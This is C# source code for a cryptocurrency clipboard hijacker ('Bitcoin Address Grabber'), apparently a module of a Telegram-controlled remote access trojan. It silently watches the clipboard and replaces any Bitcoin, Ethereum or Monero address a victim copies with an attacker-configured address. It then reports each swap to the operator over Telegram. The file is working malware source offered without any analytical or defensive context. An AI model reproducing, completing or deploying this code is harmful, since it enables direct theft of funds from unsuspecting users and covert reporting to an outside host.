// Author  : NYAN CAT
// Name    : Bitcoin Address Grabber v0.3.5
// Contact : https://github.com/NYAN-x-CAT

using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text.RegularExpressions;

namespace TelegramRAT
{
    
    internal static class Clipper
    {
        // Run
        public static void Run()
        {
            // If disabled
            if (!config.ClipperEnabled)
                return;
            // Run
            Console.WriteLine("[+] Clipper is starting...");
            new Thread(() => { Application.Run(new ClipboardNotification.NotificationForm()); }).Start();
        }
    }

    // Patterns
    internal static class PatternRegex
    {
        public readonly static Regex btc = new Regex(@"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b");
        public readonly static Regex eth = new Regex(@"\b0x[a-fA-F0-9]{40}\b");
        public readonly static Regex xmr = new Regex(@"\b4([0-9]|[A-B])(.){93}\b");
    }

    // Clipboard
    internal static class Clipboard
    {
        // Get
        public static string GetText()
        {
            string ReturnValue = string.Empty;
            Thread STAThread = new Thread(
                delegate ()
                {
                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();

            return ReturnValue;
        }
        // Set
        public static void SetText(string txt)
        {
            Thread STAThread = new Thread(
                delegate ()
                {
                    System.Windows.Forms.Clipboard.SetText(txt);
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();
        }
    }

    // Methods
    internal static class NativeMethods
    {
        public const int WM_CLIPBOARDUPDATE = 0x031D;
        public static IntPtr HWND_MESSAGE = new IntPtr(-3);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
    }

    public sealed class ClipboardNotification
    {
        public class NotificationForm : Form
        {
            private static string currentClipboard = Clipboard.GetText();
            public NotificationForm()
            {
                NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
                NativeMethods.AddClipboardFormatListener(Handle);
            }

            private bool RegexResult(Regex pattern)
            {
                if (pattern.Match(currentClipboard).Success) return true;
                else
                    return false;
            }

            protected override void WndProc(ref Message m)
            {
                if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
                {
                    currentClipboard = Clipboard.GetText();

                    if (RegexResult(PatternRegex.btc) && !currentClipboard.Contains(config.bitcoin_address) && !string.IsNullOrEmpty(config.bitcoin_address))
                    {
                        string result = PatternRegex.btc.Replace(currentClipboard, config.bitcoin_address);
                        Clipboard.SetText(result);
                        telegram.sendText($"💸 Replaced bitcoin address \"{currentClipboard}\" to \"{config.bitcoin_address}\"");
                    }

                    if (RegexResult(PatternRegex.eth) && !currentClipboard.Contains(config.etherium_address) && !string.IsNullOrEmpty(config.etherium_address))
                    {
                        string result = PatternRegex.eth.Replace(currentClipboard, config.etherium_address);
                        Clipboard.SetText(result);
                        telegram.sendText($"💸 Replaced etherium address \"{currentClipboard}\" to \"{config.etherium_address}\"");
                    }

                    if (RegexResult(PatternRegex.xmr) && !currentClipboard.Contains(config.monero_address) && !string.IsNullOrEmpty(config.monero_address))
                    {
                        string result = PatternRegex.xmr.Replace(currentClipboard, config.monero_address);
                        Clipboard.SetText(result);
                        telegram.sendText($"💸 Replaced monero address \"{currentClipboard}\" to \"{config.monero_address}\"");
                    }

                }
                base.WndProc(ref m);
            }
        }

    }
}
